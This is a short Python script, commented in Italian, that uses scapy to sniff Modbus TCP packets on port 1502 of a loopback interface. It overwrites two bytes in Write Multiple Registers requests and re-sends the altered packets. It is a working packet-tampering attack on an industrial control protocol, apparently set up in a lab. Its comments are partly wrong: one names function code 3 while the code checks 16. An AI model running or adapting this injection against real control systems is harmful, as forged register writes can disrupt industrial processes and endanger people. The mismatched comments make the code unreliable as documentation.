from scapy.all import *
from scapy.layers.inet import IP, TCP
import os

MODBUS_TCP_PORT = 1502

def intercept_modify(packet):
    """
    Intercetta i pacchetti TCP Modbus e li modifica se necessario.
    """
    if packet.haslayer(TCP) and packet[TCP].dport == MODBUS_TCP_PORT:
        if Raw in packet:  # Se il pacchetto contiene il payload
            modbus_payload = bytearray(packet[Raw].load)

            # Se il codice di funzione è 3 (Read Holding Registers)
            if modbus_payload[7] == 16:
                # Modifica il pacchetto
                print("Pacchetto Modbus TCP intercettato!")
                print("Pacchetto originale:", modbus_payload)

                # Modifica il pacchetto (esempio di cambiamento di byte)
                modbus_payload[15] = 0x11
                modbus_payload[16] = 0x11

                print("Pacchetto modificato:", modbus_payload)
                packet[Raw].load = bytes(modbus_payload)
                
                # Calcola i nuovi checksum
                # del packet[IP].chksum
                del packet[TCP].chksum

                # Invia il pacchetto modificato
                send(packet, verbose=True)
            else:
                print("Pacchetto Modbus TCP non modificato.")

if __name__ == "__main__":
    sniff(iface="Software Loopback Interface 1", prn=intercept_modify, filter="tcp port 1502", count=10)

